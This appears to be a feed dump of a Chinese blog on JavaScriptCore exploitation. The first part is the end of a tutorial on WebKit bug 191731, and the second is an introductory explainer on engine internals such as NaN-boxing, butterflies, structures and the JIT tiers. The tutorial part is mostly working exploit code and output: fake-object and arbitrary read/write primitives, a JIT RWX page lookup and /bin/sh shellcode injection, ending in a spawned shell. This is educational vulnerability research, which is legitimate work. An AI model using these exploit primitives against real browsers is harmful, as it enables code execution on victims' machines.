512&gt;&gt;&gt;</code></pre><p>伪造对象成功之后，就可以进行进一步的操作了，现在可以通过<code>victim</code>控制<code>hax</code>的butterfly指向任意地址。但是现在有个问题，这个butterfly、必须是个合法的指针，然而我们是不可以通过正常方法往对象的属性写我们指定的指针的，唯一写指针进去的方法就是直接赋值一个对象。但如果对象是一个<code>ArrayWithDouble</code>，其实我们就可以通过写double的形式写一个double进去并伪造成指针，于是我们可以做以下的操作：</p><pre><code class="javascript">controller = spray[500];victim = {    fake_header:header_arrayDouble,    fake_butterfly:controller};victim_addr = f2i(addrof(victim));hax = fakeobj(i2f(victim_addr+0x10));hax[1] = 5.2900040263529e-310;</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512#查看hax的butterfly，其实也就是controller的内存(lldb) x/2gx 0x108ab62d00x108ab62d0: 0x0108210700000337 0x0000616161616161(lldb)</code></pre><p>这样我们就间接地控制了<code>controller</code>的butterfly，而且可以指向任意地址。然后通过访问<code>controller</code>的属性，我们其实已经可以实现任意地址读写了。比如访问<code>controller.a</code>其实就是读取controller的butterfly偏移为-0x10的值。现在来尝试一下读<code>hax</code>的内存：</p><pre><code class="shell">&gt;&gt;&gt; hax[1] = i2f(f2i(addrof(hax))+0x10)2.193894026e-314&gt;&gt;&gt; hex(f2i(controller.a))0x107210700000200&gt;&gt;&gt; hax[1] = i2f(f2i(addrof(hax))+0x10+8)2.19389403e-314&gt;&gt;&gt; hex(f2i(controller.a))0x7ff8000000000000&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p189:101}, ArrayWithDouble, Proto:0x108ac80a0, Leaf]), StructureID: 512(lldb) x/2gx 0x108ac83b00x108ac83b0: 0x0108210700000200 0x0000000108ab62d0(lldb)</code></pre><p>可以看到虽然可以读数据了，但是读的数据并不准确，首先第一个读出来的double是解码的，这个不难理解。奇怪的是第二个，<code>hax</code>的butterfly明明被指向了<code>controller</code>，这是一个合法的对象，应该是读不出来数据的，但是这里居然也能读，虽然数据是错的。既然这个是对象，其实我们完全可以用前面写好的<code>addrof()</code>来读：</p><pre><code class="shell">&gt;&gt;&gt; hex(f2i(addrof(controller.a)))0x108ab62d0</code></pre><p>这个读出来就是准确的，用同样的方法去读double的话其实还是会有解码的情况：</p><pre><code class="shell">&gt;&gt;&gt; hex(f2i(addrof(controller.a)))0x107210700000200</code></pre><p>造成这种情况的原因主要是我前面构造的<code>addrof()</code>，它返回的值肯定是JSValue解码后的结果，所以我们可以利用现在掌握的任意读写能力重新构造更稳定可靠的<code>addrof()</code>和<code>fakeobj()</code>，构造如下：</p><pre><code class="javascript">var unboxed = [2.2];#防止unboxed成为CopyOnWriteArrayWithDouble，多赋值一次可确保ArrayWithDouble。unboxed[0] = 3.3;#boxed为ArrayWithContigousvar boxed = [{}];#使boxed和unboxed的butterfly指向同一片内存，类似ArrayBuffer，我们就可以用不同的形式表示同一块内存。hax[1] = unboxed;var shared = controller[1];hax[1] = boxed;controller[1] = shared;#由于赋值过对象，hax的类型会变成ArrayWithContigous，重新设定类型方便之后赋值。victim.fake_header = header_arrayDouble;var stage2 = {    addrof : function (obj){        boxed[0] = obj;        return f2i(unboxed[0]);    },    fakeobj : function (addr){        unboxed[0] = i2f(addr);        return boxed[0];    },    read64 : function (addr){        hax[1] = i2f(addr+0x10);        return stage2.addrof(controller.a);    },};</code></pre><p>我顺便写了负责任意读的方法<code>read64()</code>，可以试试效果：</p><pre><code class="shell">&gt;&gt;&gt; stage2.read64(stage2.addrof(hax))74345707800101380&gt;&gt;&gt; hex(74345707800101380)0x108210700000200&gt;&gt;&gt; stage2.read64(stage2.addrof(hax)+8)4440416976&gt;&gt;&gt; hex(4440416976)0x108ab62d0&gt;&gt;&gt; describe(hax)Object: 0x108ac83b0 with butterfly 0x108ab62d0 (Structure 0x108a4a3e0:[Array, {a:100, p188:101}, ArrayWithDouble, Proto:0x108ac80a0]), StructureID: 512(lldb) x/2gx 0x108ac83b00x108ac83b0: 0x0108210700000200 0x0000000108ab62d0(lldb)</code></pre><p>这就很稳了，但其实有时候读double还不是很准，我猜测是因为精度问题，但其实问题不大。现在尝试构造一个任意写的方法：</p><pre><code class="javascript">write64 : function (addr, content){        hax[1] = i2f(addr+0x10);        controller.a = this.fakeobj(content);}</code></pre><p>试试效果：</p><pre><code class="javascript">var stage2 = {    addrof : function (obj){        boxed[0] = obj;        return f2i(unboxed[0]);    },    fakeobj : function (addr){        unboxed[0] = i2f(addr);        return boxed[0];    },    read64 : function (addr){        hax[1] = i2f(addr+0x10);        return this.addrof(controller.a);    },    write64 : function (addr, content){        hax[1] = i2f(addr+0x10);        controller.a = this.fakeobj(content);    },    test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj)        value = 0x1122334455667788;        this.write64(obj_addr+8, value);    },};stage2.test();</code></pre><pre><code class="shell">&gt;&gt;&gt; describe(testObj)Object: 0x1082b0100 with butterfly 0x1122334455667800 (Structure 0x10820d3b0:[Object, {}, NonArrayWithDouble, Proto:0x1082b4000, Leaf]), StructureID: 1333&gt;&gt;&gt;</code></pre><p>发现写进去的数据不完整，这是因为JavaScript不能表示那么大的整型，所以我选择一次写四个字节。但是测试的时候还是出了错：</p><pre><code class="javascript">    test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj);        value = 0x11223344;        this.write64(obj_addr+8, value);    },</code></pre><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.jsProcess 42272 stopped* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x11223ed8)    frame #0: 0x000000010000c145 jsc`JSC::MarkedBlock::vm(this=0x0000000011220000) const at MarkedBlock.h:472:21   469   470     inline VM* MarkedBlock::vm() const   471     {-&gt; 472         return footer().m_vm;   473     }   474   475     inline WeakSet&amp; MarkedBlock::Handle::weakSet()Target 0: (jsc) stopped.(lldb)</code></pre><p>我猜测是因为gc的检查导致的问题，所以我写了个简单的<code>passGC()</code>：</p><pre><code class="javascript">passGC : function (){        var passObj = {};        passObj[0] = 1.1;        this.write64(this.addrof(passObj+8), 0x7);},</code></pre><p>再次运行：</p><pre><code class="javascript">test : function(){        testObj = {};        testObj[0] = 1.1;        obj_addr = this.addrof(testObj);        this.passGC();        value = 0x11223344;        this.write64(obj_addr+8, value);},</code></pre><pre><code class="shell">(lldb) run -i ../bug_191731/test/poc.js&gt;&gt;&gt; describe(testObj)Object: 0x108ab0100 with butterfly 0x11223344 (Structure 0x108a0d420:[Object, {}, NonArrayWithDouble, Proto:0x108ab4000, Leaf]), StructureID: 1334&gt;&gt;&gt;</code></pre><p>看起来效果还不错，解决了写的问题，之后就需要考虑下写哪里的问题了，因为JIT会在内存中申请RWX的内存，所以可以构造一个JIT编译的function出来，然后找到代码的位置，将shellcode写进去，最后执行function就可以了。构造JIT Function：</p><pre><code class="javascript">getJITFunction : function (){        function target(num) {            for (var i = 2; i &lt; num; i++) {                if (num % i === 0) {                    return false;                }            }            return true;        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        for (var i = 0; i &lt; 1000; i++) {            target(i);        }        return target;},</code></pre><p>查看进程的内存访问权限，可以在另一个终端输入<code>vmmap [pid]</code>：</p><pre><code class="shell">JS JIT generated code  00004e12a4201000-00004e12e4201000 [  1.0G    24K    24K    32K] rwx/rwx SM=PRV</code></pre><p>可以看到JIT的内存访问权限是RWX。</p><p>构造好了函数之后，可以通过任意读得到这块内存的地址：</p><pre><code class="javascript">getRWXMem: function(){        shellcodeFunc = this.getJITFunction()        target_addr = this.read64(this.addrof(shellcodeFunc)+8*3)        target_addr = this.read64(target_addr + 8*3)        target_addr = this.read64(target_addr + 8*4)        return [shellcodeFunc, target_addr]},</code></pre><pre><code class="shell">&gt;&gt;&gt; hex(shellcodeObj[1])0x33696e808d19(lldb) x/10i 0x33696e808d19    0x33696e808d19: 49 bb 71 e7 ff 08 01 00 00 00  movabsq $0x108ffe771, %r11        ; imm = 0x108FFE771    0x33696e808d23: 41 c6 03 00                    movb   $0x0, (%r11)    0x33696e808d27: 55                             pushq  %rbp    0x33696e808d28: 48 89 e5                       movq   %rsp, %rbp    0x33696e808d2b: 49 bb 60 e7 ff 08 01 00 00 00  movabsq $0x108ffe760, %r11        ; imm = 0x108FFE760    0x33696e808d35: 4c 89 5d 10                    movq   %r11, 0x10(%rbp)    0x33696e808d39: 8b 75 20                       movl   0x20(%rbp), %esi    0x33696e808d3c: 83 fe 02                       cmpl   $0x2, %esi    0x33696e808d3f: 0f 83 8d f8 ff ff              jae    0x33696e8085d2    0x33696e808d45: 48 89 ef                       movq   %rbp, %rdi(lldb)</code></pre><p>看汇编差不多就知道是构造出来的target函数了。构造一个写shellcode的函数：</p><pre><code class="javascript">injectShellcode : function (addr, shellcode){        var theAddr = addr;        this.passGC();        for(var i=0, len=shellcode.length; i &lt; len; i++){            this.write64(target_addr+i, shellcode[i].charCodeAt());        }},shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05&quot;;this.injectShellcode(shellcodeObj[1], shellcode);</code></pre><p>写的时候出了问题，中间可能还会触发GC，而且是在固定位置触发，所以在中间加上<code>passGC()</code>就行了。</p><pre><code class="javascript">injectShellcode : function (addr, shellcode){        var theAddr = addr;        this.passGC();        for(var i=0, len=shellcode.length; i &lt; len; i++){            if(i == 0x1f){                this.passGC();            }            this.write64(target_addr+i, shellcode[i].charCodeAt());        }}shellcodeObj = this.getRWXMem();print(hex(shellcodeObj[1]));shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05&quot;;this.injectShellcode(shellcodeObj[1], shellcode);var shellcodeFunc = shellcodeObj[0];shellcodeFunc();</code></pre><p>直接使用jsc运行脚本，就不要lldb了：</p><pre><code class="shell">$ ./WebKitBuild/Debug/bin/jsc -i ../bug_191731/test/exp.jsbash-3.2$ lsCMakeLists.txt        ChangeLog-2018-01-01    LayoutTests        ManualTests        Source            WebKit.xcworkspace    WebPlatformTestsChangeLog        Examples        Makefile        PerformanceTests    Tools            WebKitBuild        WebsitesChangeLog-2012-05-22    JSTests            Makefile.shared        ReadMe.md        WebDriverTests        WebKitLibrariesbash-3.2$bash-3.2$ exitexit</code></pre><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h3><p>[1] <a href="https://github.com/joshua7o8v/Browser/tree/master/WebKit/bug_191731" target="_blank" rel="noopener">https://github.com/joshua7o8v/Browser/tree/master/WebKit/bug_191731</a></p><p>[2] <a href="https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html" target="_blank" rel="noopener">https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html</a></p><p>[3] <a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/</a></p><p>[4] <a href="https://github.com/saelo/jscpwn" target="_blank" rel="noopener">https://github.com/saelo/jscpwn</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> JavascriptCore </tag>
            
            <tag> Webkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript engine exploit 1</title>
      <link href="/2019/10/30/Javascript-engine-exploit-1/"/>
      <url>/2019/10/30/Javascript-engine-exploit-1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/183804" target="_blank" rel="noopener">首发于安全客：https://www.anquanke.com/post/id/183804</a></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>写这篇文章的目的主要是希望记录下自己学习的过程，也将自己的学习经历分享给希望学习JS引擎漏洞利用的初学者。</p><p>我刚开始学习的是JSC（JavaScriptCore），这是Safari浏览器所使用的内核WebKit的JS引擎。我选择这个目标入手的原因主要是这个比较简单，很多大佬给出的JS引擎的研究难度基本都是：</p><p>V8（Chrome）&gt; Spidermonkey（Firefox）&gt; JacaScriptCore（Safari）&gt; Chakra（Edge）</p><p>因为Chakra快被微软抛弃了，所以我还是选择了JSC。</p><h3 id="0x01-JS引擎的一些基础知识"><a href="#0x01-JS引擎的一些基础知识" class="headerlink" title="0x01 JS引擎的一些基础知识"></a>0x01 JS引擎的一些基础知识</h3><p>在学习JS引擎的漏洞利用之前，对JS引擎的一些内部运行原理做一个了解肯定是必要的。当然，也不必把所有原理都了解，由于我是通过调试特定的漏洞来进行学习（大部分初学者都是如此），所以我们只需要了解到与这个漏洞相关的一些知识就足够了。推荐去看saelo在2016年发的paper：<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">Attacking javascript engines</a></p><p>我在下面也引述文章中的部分内容。</p><h4 id="JavaScript-engine-overview"><a href="#JavaScript-engine-overview" class="headerlink" title="JavaScript engine overview"></a>JavaScript engine overview</h4><p>总体来看，JavaScript引擎包括了三个部分：</p><ul><li>一个基础的编译器，至少需要包含一个JIT（Just-in-time）。</li><li>一个JavaScript VM，用来运行JavaScript代码。</li><li>一个JavaScript Runtime，用来提供一些内置Objects和Functions。</li></ul><p>我们不需要关心编译器的内部原理，因为跟我们的漏洞利用关系不大（至少看起来关系不大），我们只需要把编译器看作一个 “输入源码，输出字节码”的黑盒就行了。</p><h4 id="The-VM-Values-and-NaN-boxing"><a href="#The-VM-Values-and-NaN-boxing" class="headerlink" title="The VM, Values, and NaN-boxing"></a>The VM, Values, and NaN-boxing</h4><p>VM通常都包含一个可以直接执行字节码的解释器。VM被实现为<code>stack-based</code>的机器（相对于<code>register-based</code>来讲），从而可以通过栈来对值进行操作。对于具体的操作码的实现可能看起来和下面一样：</p><pre><code class="c">CASE(JSOP_ADD){  MutableHandleValue lval = REGS.stackHandleAt(-2);  MutableHandleValue rval = REGS.stackHandleAt(-1);  MutableHandleValue res = REGS.stackHandleAt(-2);  if (!AddOperation(cx, lval, rval, res))    goto error;  REGS.sp--;}END_CASE(JSOP_ADD)</code></pre><p>这段代码截取自Firefox的JS引擎Spidermonkey，而JSC使用汇编实现的类似功能，看起来就没有上面这么直观。对JSC的实现感兴趣的可以去看这个文件<code>Webkit/Source/JavaScriptCore/llint/LowLevelInterpreter64.asm</code>。</p><p>通常初级JIT（first stage JIT or called baseline JIT）负责减轻一些解释器的调度开销，而高级JIT（higher stage JIT）则会做一些比较复杂的优化操作。有点类似于我们平常所使用的AOT（ahead-of-time）编译器，就比如gcc。优化型JIT（也就是前面提到的高级JIT）通常都是推测型的，意思就是它们会基于一些推测来进行优化，比如它会认为一个变量是而且一直是数字类型。当然这种推测也可能出错，当遇到出错的时候JIT就会回退到推测之前的状态。</p><p>JavaScript是动态类型语言，因此类型信息与运行时的变量有关，而不是编译时的变量。JavaScript类型系统定义了几个元类型（number, string, boolean, null, undefined, symbol）和对象（array, function）。需要注意的是JavaScript没有像其他语言一样包含‘类’的概念。取而代之的是JavaScript使用了所谓“基于原型的继承（prototype-based-inheritance）”，每个对象都有一个指向<code>prototype</code>对象的引用，这个prototype对象包含了指向它的对象的属性。</p><p>出于性能考虑（快速拷贝，适应64位的寄存器架构等），所有主流的JavaScript引擎在表示一个Value的时候都不超过八字节。一些JS引擎，比如v8，会使用<code>tagged pointers</code>来表示值，它会使用最低有效位来标识一个值是指针还是立即数。JSC和Spidermonkey则使用了另一种叫做<code>NaN-boxing</code>的概念。在<code>NaN-boxing</code>中使用了多种位模式来表示NaN（Not-a-Number），所以可以将这些位模式来编码其他的值，以下是IEEE 754的规则总结：</p><table><thead><tr><th>形式</th><th>指数</th><th>小数部分</th></tr></thead><tbody><tr><td>零</td><td>0</td><td>0</td></tr><tr><td>非规约形式</td><td>0</td><td>大于0小于1</td></tr><tr><td>规约形式</td><td>1到2^{e}-2</td><td>大于等于1小于2</td></tr><tr><td>无穷</td><td>2^{e}-1</td><td>0</td></tr><tr><td>NaN</td><td>2^{e}-1</td><td>非0</td></tr></tbody></table><p>这些多余的位模式足够用来编码整型和指针了，也因为使用了NaN-boxing，对于64位平台而言，目前只有48位用于寻址。</p><p>JSC使用的这个方案在<code>Webkit/Source/JavaScriptCore/runtime/JSCJSValue.h</code>中有很好的解释，引用如下：</p><pre><code class="c">            /*      ...      * The top 16-bits denote the type of the encoded JSValue:      *      *     Pointer {  0000:PPPP:PPPP:PPPP      *              / 0001:****:****:****      *     Double  {         ...      *              \ FFFE:****:****:****      *     Integer {  FFFF:0000:IIII:IIII      *      * The scheme we have implemented encodes double precision values by      * performing a 64-bit integer addition of the value 2^48 to the number.      * After this manipulation no encoded double-precision value will begin      * with the pattern 0x0000 or 0xFFFF. Values must be decoded by      * reversing this operation before subsequent floating point operations      * may be performed.      *      * 32-bit signed integers are marked with the 16-bit tag 0xFFFF.      *      * The tag 0x0000 denotes a pointer, or another form of tagged      * immediate. Boolean, null and undefined values are represented by      * specific, invalid pointer values:      *      *     False:     0x06      *     True:      0x07      *     Undefined: 0x0a      *     Null:      0x02      *      ...      */</code></pre><p>总结：</p><ul><li>Pointer：[0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）</li><li>Double：[0001～FFFE][xxxx:xxxx:xxxx]</li><li>Intger：[FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）</li><li>False：[0000:0000:0000:0006]</li><li>True：[0000:0000:0000:0007]</li><li>Undefined：[0000:0000:0000:000a]</li><li>Null：[0000:0000:0000:0002]</li></ul><p>有意思的是0x0不是一个合法的JSValue，它会在在引擎中导致崩溃。</p><h4 id="Objects-and-Arrays"><a href="#Objects-and-Arrays" class="headerlink" title="Objects and Arrays"></a>Objects and Arrays</h4><p>JavaScript中的对象实际上就是属性的集合，这些属性都可用（key, value）的键值对来表示。可以使用点（foo.bar）或者方括号（foo[‘bar’]）来访问属性。至少在理论上，在使用键来查找值之前都需要先将键转化为字符串的形式。</p><p>数组被描述为特殊的(“exotic”)对象，如果属性名称由32位整数来表示的话，这些属性也被称为元素。如今的大多数引擎都将这个概念扩展到了所有对象。然后，数组就是拥有<code>length</code>属性的特殊对象，它的值始终等于最高元素的索引加一。这些规定的结果就是，每个对象都具有通过字符串或者符号键访问的属性，以及通过整数索引访问的属性。</p><p>在内部，JSC将属性和元素存储在同一片内存区域中，并且在对象内部存放指向这块内存的指针。这个指针指向这片内存的中间位置，左边存放对象的属性值，右边存放对象的元素值，而在左边最近的那个内存单元存放了一个header，这个header里包含了<code>length</code>的值。这样的内存表现形式被称为<code>Butterfly</code>，在下文我们都将这种内存和指向它的指针都称为<code>Butterfly</code>，这样会使文章理解起来轻松一些。</p><pre><code class="c">--------------------------------------------------------.. | propY | propX | length | elem0 | elem1 | elem2 | ..--------------------------------------------------------                            ^                            |            +---------------+            |  +-------------+  | Some Object |  +-------------+</code></pre><p>实际上使用Butterfly来存储数据只是一个可选项（Optional），如果对象属性不多（不大于6个）而且不是数组的时候，对象的属性值将不会申请Butterfly，而是存储在对象内部，内存结构如下：</p><pre><code class="shell">object            :    objectHeader    butterfly(Null)object+0x10    :    prop_1                prop_2object+0x20    :    prop_3                prop_4object+0x30    : prop_5                prop_6</code></pre><p>虽然通常来讲，元素不需要线性地存储在内存中，但特别地：</p><pre><code class="c">a = [];a[0] = 42;a[10000] = 42;</code></pre><p>这段代码可能会导致数组以某种分散的模式来存储，这种模式会根据给定的索引额外在数组的后备存储内存中映射一个索引出来。这样的话，这个数组就不需要请求10001个元素所需要的内存了。除了不同的数组存储模式，数组也拥有不同的表现形式来表示存储的数据。举个例子，一个32位的整型数组可能会以原生形式（native form）存储来避免NaN-boxing的解包和重打包操作，这样也节约了内存。因此JSC也在<code>Webkit/Source/JavaScriptCore/runtime/IndexingType.h</code>中定义了一组不同的索引类型。最重要的部分有：</p><pre><code>    ArrayWithInt32      = IsArray | Int32Shape;    ArrayWithDouble     = IsArray | DoubleShape;    ArrayWithContiguous = IsArray | ContiguousShape;</code></pre><p>第三种存储的是JSValue，前两种存储的都是它们的原生类型。</p><p>到这里可能有读者会好奇在这种模式下，对象的属性是如何被索引到的，这点将会在后面深入讨论，简单来讲，有一种被称为<code>structure</code>的特殊元对象通过给定的属性名，将每个对象的属性映射到对应内存位置。</p><h4 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h4><p>Functions在Javascript十分重要，因此它也值得我们对它进行特别的讨论。</p><p>当执行一个函数体时，两个特殊的变量将可以访问。一个是<code>arguments</code>，它提供对参数和调用者的访问，从而使得可以创建具有参数的Function。另一个就是<code>this</code>，根据Function的调用情况，<code>this</code>可以指向不同的对象：</p><ul><li>如果调用的Function作为构造函数（ new func(…) ），<code>this</code>指向新创建的对象，在Function定义期间，构造函数就已经为新对象设置了<code>.prototype</code>属性。</li><li>如果Function作为某个对象的方法被调用（obj.func(…)），<code>this</code>将指向这个对象。</li><li>否则<code>this</code>只是指向当前的全局对象，因为它在Function之外使用。</li></ul><p>因为Functions是JavaScript中十分重要的对象，它们同样具有属性。根据刚才的描述我们知道了<code>.prototype</code>属性，另外每个Function（实际上是Function prototype）还有两个比较有趣的属性，<code>.call</code>和<code>.apply</code>函数，允许使用给定的<code>this</code>和一些参数来调用Function。例如，可以使用它们来完成装饰器的功能：</p><pre><code class="javascript">function decorate(func) {    return function() {        for (var i = 0; i &lt; arguments.length; i++) {            // do something with arguments[i]        }        return func.apply(this, arguments);    };}</code></pre><p>这同样也对Function在JS引擎的内部实现有一定的影响，这个导致了Function不能假定调用它们的对象的类型，因为这些对象可能是任意类型，因此所有的JavaScript内部Funciton不仅要检查参数的类型，也要对<code>this</code>对象进行类型检查。</p><p>在内部，内置的函数或者方法通常以两种方法实现，C++的Native Function或者是JavaScript Function。可以看一个JSC中的Native Function示例，<code>Math.pow()</code>的实现：</p><pre><code class="c"> EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec){   // ECMA 15.8.2.1.13   double arg = exec-&gt;argument(0).toNumber(exec);   double arg2 = exec-&gt;argument(1).toNumber(exec);   return JSValue::encode(JSValue(operationMathPow(arg, arg2))); }</code></pre><p>我们可以看到：</p><ol><li>Native JavaScript Function的签名。</li><li>如何使用<code>argument</code>提取参数（如果参数不够就返回undefine）。</li><li>如何将参数转化为需要的类型，有一组特定的转换规则，这一点将在之后详细讨论。</li><li>如何对本地数据类型进行实际操作。</li><li>如何将结果返回给调用者，这里简单地将结果编码为了JSValue。</li></ol><p>这里还有一个显而易见的部分，各种核心的操作(<code>operationMathPow(arg, arg2)</code>)都是用单独的函数，这样它们可以直接被JIT编译了的代码调用。</p><h4 id="The-Structures"><a href="#The-Structures" class="headerlink" title="The Structures"></a>The Structures</h4><p>这个部分属于JavaScript对象模型的内容，关系到JavaScript引擎如何去访问对象的属性。因为访问属性在JavaScript中是一个十分频繁的操作，为了提高访问速度，每个主流的JavaScript引擎都对此做了优化，在不同的引擎中对这种技术的称呼也各不相同：</p><ul><li>在学术论文中被称为 <em>Hidden Classes</em></li><li>在V8中是 <em>Maps</em></li><li>在Chakra中是 <em>Types</em></li><li>在JavaScriptCore中是 <em>Structures</em></li><li>在Spidermonkey中是 <em>Shapes</em></li></ul><p>根据ECMAScript的规范，所有JavaScript对象都被定义为一个由字符串键值映射到属性值的一个字典。引用MDN的描述：</p><blockquote><p>An object is a collection of properties, and a property is an association between a name (or <em>key</em>) and a value.</p></blockquote><p>既然如此，作为键值的字符串如果存储在对象的内存中将会十分浪费空间，因为这样的话每生成一个对象就出多出一份键值的拷贝。而在JavaScript中，多个对象具有相同的属性是经常发生的事情，从某个方面来讲，这些对象都具有相同的形状（Shapes），也可以说具有相同的结构（Structure）。比如：</p><pre><code class="javascript">const object1 = { x: 1, y: 2 };const object2 = { x: 3, y: 4 };</code></pre><p><code>object1</code>和<code>object2</code>虽然是两个不同的对象，但是他们的键值都是一样的。这种情况下它们就具有相同的结构，在JavaScriptCore中也能看到它们具有相同的StructureID。</p><pre><code class="shell">&gt;&gt;&gt; describe(object1)Object: 0x106ab0100 with butterfly 0x0 (Structure 0x106a500e0:[Object, {x:0, y:1}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 289&gt;&gt;&gt; describe(object2)Object: 0x106ab0140 with butterfly 0x0 (Structure 0x106a500e0:[Object, {x:0, y:1}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 289&gt;&gt;&gt;</code></pre><p>如果我们要访问对象的属性，JSC就会先根据StructureID找到对应的Structure，然后找到对应的属性名，读取属性在内联存储或者是butterfly中的偏移值，最后读取属性值。</p><p>如果此时给<code>object2</code>增加一个属性<code>z</code>，JavaScriptCore就会在Structure链中寻找有没有只拥有<code>x,y,z</code>三个属性的Structure，如果没有则重新创建一个并分配一个新的StructureID。</p><pre><code class="shell">&gt;&gt;&gt; objectY.z = 00&gt;&gt;&gt; describe(objectY)Object: 0x106ab0140 with butterfly 0x0 (Structure 0x106a50150:[Object, {x:0, y:1, z:2}, NonArray, Proto:0x106ab4000, Leaf]), StructureID: 290&gt;&gt;&gt;</code></pre><h4 id="Just-In-Time-compiler"><a href="#Just-In-Time-compiler" class="headerlink" title="Just-In-Time compiler"></a>Just-In-Time compiler</h4><p>前面提到过JIT，但没有细说。其实JIT也是一个编译器，可以简单理解为和gcc一样的编译器，不过JS引擎中的JIT是将JavaScript代码编译成了机器码。JIT在JSC中一共分为四个等级：</p><ol><li>LLInt (LowLevelInterpreter)</li><li>Baseline JIT compiler</li><li>DFG JIT</li><li>FTL JIT</li></ol><h5 id="LLInt"><a href="#LLInt" class="headerlink" title="LLInt"></a>LLInt</h5><p>llint是JavaScriptCore虚拟机的基础组件，逻辑非常简单，可以理解为一个switch循环，传入对应的JavaScript机器码，然后执行对应的指令。</p><h5 id="Baseline-JIT-compiler"><a href="#Baseline-JIT-compiler" class="headerlink" title="Baseline JIT compiler"></a>Baseline JIT compiler</h5><p>当一个function被多次调用之后，它就会变得”hot”，这时候就需要使用JIT compiler对它进行优化。在<code>Source/JavaScriptCore/jit/JIT.cpp</code>中：</p><blockquote><p><em>// We can only do this optimization because we execute ProgramCodeBlock’s exactly once.</em></p><p>// This optimization would be invalid otherwise. When the LLInt determines it wants to*</p><p><em>// do OSR entry into the baseline JIT in a loop, it will pass in the bytecode offset it</em></p><p><em>// was executing at when it kicked off our compilation. We only need to compile code for</em></p><p><em>// anything reachable from that bytecode offset.</em></p></blockquote><p>当function需要进一步优化的时候，JSC就会通过OSR（On Stack Replacement ）从LLInt切换到Baseline JIT。</p><h5 id="DFG-JIT"><a href="#DFG-JIT" class="headerlink" title="DFG JIT"></a>DFG JIT</h5><p>引用WebKit官方文档<a href="https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/" target="_blank" rel="noopener">WebKit JIT</a>中的一段话：</p><blockquote><p>The first execution of any function always starts in the interpreter tier. As soon as any statement in the function executes more than 100 times, or the function is called more than 6 times (whichever comes first), execution is diverted into code compiled by the Baseline JIT. This eliminates some of the interpreter’s overhead but lacks any serious compiler optimizations. Once any statement executes more than 1000 times in Baseline code, or the Baseline function is invoked more than 66 times, we divert execution again to the DFG JIT.</p></blockquote><p>和前面从LLInt切换到Baseline JIT的条件类似，如果一个函数在Baseline JIT中执行次数过多，又会切换到DFG JIT中。</p><p>从文档中还可以看到一个关于DFG的细节：</p><blockquote><p>The DFG starts by converting bytecode into the DFG CPS form, which reveals data flow relationships between variables and temporaries. Then profiling information is used to infer guesses about types, and those guesses are used to insert a minimal set of type checks. Traditional compiler optimizations follow. The compiler finishes by generating machine code directly from the DFG CPS form.</p></blockquote><p>DFG会根据搜集到的信息去推测变量的类型，如果认定了一个变量的类型，在之后将不会对变量类型进行检查，这个对我们之后的利用会很有帮助。</p><h5 id="FTL-JIT"><a href="#FTL-JIT" class="headerlink" title="FTL JIT"></a>FTL JIT</h5><blockquote><p>We reuse most of the DFG phases including its CPS-based optimizations. The new FTL pipeline is a drop-in replacement for the third-tier DFG backend. It involves additional JavaScript-aware optimizations over DFG SSA form, followed by a phase that lowers DFG IR (<em>intermediate representation</em>) to LLVM IR. We then invoke LLVM’s optimization pipeline and LLVM’s MCJIT backend to generate machine code.</p></blockquote><p>其实FTL相对于其他三个JIT算是新加入的一个技术，设计它的目的是想让JavsScript的运行更加接近C的速度，事实证明确实非常接近了。值得一提的是FTL重用了DFG的一些部分，包括类型推理引擎。</p><h3 id="0x02-搭建调试环境"><a href="#0x02-搭建调试环境" class="headerlink" title="0x02 搭建调试环境"></a>0x02 搭建调试环境</h3><p>官方文档：<a href="https://webkit.org/building-webkit/" target="_blank" rel="noopener">Building Webkit</a></p><p>我使用的系统是MacOS，不过WebKit同样可以在其他系统（Windows、Linux）编译运行，我看到大多数人会选择在Ubuntu 18.04上编译，不过我没编译成功过，不知道什么原因。我直接引用别人在Ubuntu 18.04的编译命令：</p><pre><code class="shell"># sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf$ git clone git://git.webkit.org/WebKit.git &amp;&amp; cd WebKit$ Tools/gtk/install-dependencies$ Tools/Scripts/build-webkit --jsc-only --debug$ cd WebKitBuild/Debug$ 